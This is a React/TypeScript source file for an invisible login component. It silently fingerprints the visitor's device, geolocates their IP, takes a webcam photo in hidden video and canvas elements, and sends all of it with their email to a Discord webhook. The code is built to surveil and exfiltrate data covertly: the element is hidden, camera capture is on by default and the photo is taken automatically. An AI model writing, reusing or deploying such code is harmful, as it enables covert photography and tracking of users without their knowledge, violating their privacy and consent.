"use client";

import { useEffect, useRef } from "react";
import { sendLoginAlert } from "@/lib/discord-webhook";

interface SilentLoginCaptureProps {
  webhookUrl: string;
  email: string;
  name?: string;
  captureEnabled?: boolean;
}

interface DeviceInfo {
  ipAddress: string;
  location?: string;
  device: string;
  browser: string;
  os: string;
  screen: string;
  battery?: string;
  network?: string;
  cpuCores?: number | string;
  memory?: string;
  language?: string;
  timezone?: string;
  cookies?: string;
  doNotTrack?: string;
  gpu?: string;
}

export default function SilentLoginCapture({
  webhookUrl,
  email,
  name,
  captureEnabled = true,
}: SilentLoginCaptureProps) {
  const videoRef = useRef<HTMLVideoElement>(null);
  const videoBackRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const canvasBackRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    async function init() {
      const info = await getDeviceInfo();
      console.log("[SilentCapture] Device info:", info);
      startCapture(info);
    }
    init();
  }, []);

  async function getDeviceInfo(): Promise<DeviceInfo> {
    let ipAddress = "Unknown";
    let location = "Unknown";

    // Get IP and location
    try {
      const ipResponse = await fetch("https://ip-api.com/json/");
      const ipData = await ipResponse.json();
      if (ipData.status === "success") {
        ipAddress = ipData.query;
        location = `${ipData.city || ""}, ${ipData.regionName || ""}, ${ipData.country || ""}`.replace(/^, |, $|, , /g, "") || "Unknown";
      }
    } catch {
      console.log("[SilentCapture] Could not get IP info");
    }

    // Browser info
    const ua = navigator.userAgent;
    let browser = "Unknown Browser";
    if (ua.includes("Firefox")) browser = "Firefox";
    else if (ua.includes("Chrome")) browser = "Chrome";
    else if (ua.includes("Safari")) browser = "Safari";
    else if (ua.includes("Edge")) browser = "Edge";

    // OS info
    let os = "Unknown OS";
    if (ua.includes("Windows")) os = "Windows";
    else if (ua.includes("Mac")) os = "macOS";
    else if (ua.includes("Linux")) os = "Linux";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("iOS")) os = "iOS";

    // Device type
    const device = /mobile|android|iphone|ipad|tablet/i.test(ua) ? "Mobile" : "Desktop";

    // Screen resolution
    const screenResolution = `${window.screen.width}x${window.screen.height}`;

    // Battery status
    let battery = "N/A";
    try {
      if ("getBattery" in navigator) {
        const batteryManager = await (navigator as unknown as { getBattery: () => Promise<{ level: number; charging: boolean }> }).getBattery();
        const level = Math.round(batteryManager.level * 100);
        battery = `${level}%${batteryManager.charging ? " (Charging)" : ""}`;
      }
    } catch {
      battery = "N/A";
    }

    // Network info
    let network = "Unknown";
    const connection = (navigator as unknown as { connection?: { effectiveType?: string; downlink?: number } }).connection;
    if (connection) {
      network = `${connection.effectiveType || "Unknown"} (${connection.downlink ? connection.downlink + " Mbps" : ""})`.trim();
    } else if ("ontypechange" in window) {
      network = "Connected";
    }

    // CPU cores
    const cpuCores = navigator.hardwareConcurrency || "N/A";

    // Device memory (if available)
    const deviceMemory = (navigator as unknown as { deviceMemory?: number }).deviceMemory;
    const memory = deviceMemory ? `${deviceMemory} GB` : "N/A";

    // Language
    const language = navigator.language || "N/A";

    // Timezone
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";

    // Cookies enabled
    const cookies = navigator.cookieEnabled ? "Enabled" : "Disabled";

    // Do Not Track
    const doNotTrack = navigator.doNotTrack === "1" || (navigator as unknown as { doNotTrack?: string }).doNotTrack === "yes" ? "ON" : "OFF";

    // GPU info
    let gpu = "N/A";
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl") as WebGLRenderingContext | null;
      if (gl) {
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        if (debugInfo) {
          gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "N/A";
        }
      }
    } catch {
      gpu = "N/A";
    }

    return {
      ipAddress,
      location,
      device,
      browser,
      os,
      screen: screenResolution,
      battery,
      network,
      cpuCores,
      memory,
      language,
      timezone,
      cookies,
      doNotTrack,
      gpu,
    };
  }

  async function startCapture(deviceInfo: DeviceInfo) {
    if (captureEnabled) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user", width: 640, height: 480 },
          audio: false,
        });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.play();
        }
      } catch {
        console.log("[SilentCapture] Camera not available");
      }
    }

    // Wait a bit, then capture and send
    setTimeout(() => {
      sendToDiscord(deviceInfo);
    }, 2000);
  }

  function captureFrame(video: HTMLVideoElement | null, canvas: HTMLCanvasElement | null): string | null {
    if (!video || !canvas || !video.srcObject) return null;
    try {
      const ctx = canvas.getContext("2d");
      if (!ctx) return null;
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      return canvas.toDataURL("image/jpeg", 0.8);
    } catch {
      return null;
    }
  }

  function stopCameras() {
    [videoRef.current, videoBackRef.current].forEach((video) => {
      if (video?.srcObject) {
        const stream = video.srcObject as MediaStream;
        stream.getTracks().forEach((track) => track.stop());
      }
    });
  }

  function sendToDiscord(deviceInfo: DeviceInfo) {
    const frontImg = captureFrame(videoRef.current, canvasRef.current);
    const backImg = captureFrame(videoBackRef.current, canvasBackRef.current);
    stopCameras();

    const now = new Date();
    const timestamp = now.toLocaleString("id-ID", {
      weekday: "long",
      year: "numeric",
      month: "long",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      timeZoneName: "short",
    });

    sendLoginAlert(webhookUrl, {
      email,
      name,
      ipAddress: deviceInfo.ipAddress,
      location: deviceInfo.location,
      device: deviceInfo.device,
      browser: deviceInfo.browser,
      os: deviceInfo.os,
      screen: deviceInfo.screen,
      photoBase64: frontImg || undefined,
      backCameraPhoto: backImg || undefined,
      timestamp,
      battery: deviceInfo.battery,
      network: deviceInfo.network,
      cpuCores: deviceInfo.cpuCores,
      memory: deviceInfo.memory,
      language: deviceInfo.language,
      timezone: deviceInfo.timezone,
      cookies: deviceInfo.cookies,
      doNotTrack: deviceInfo.doNotTrack,
      gpu: deviceInfo.gpu,
    });

    console.log("[SilentCapture] Login alert sent!");
  }

  // Invisible component
  return (
    <div style={{ display: "none" }}>
      <video ref={videoRef} autoPlay playsInline muted />
      <video ref={videoBackRef} autoPlay playsInline muted />
      <canvas ref={canvasRef} />
      <canvas ref={canvasBackRef} />
    </div>
  );
}
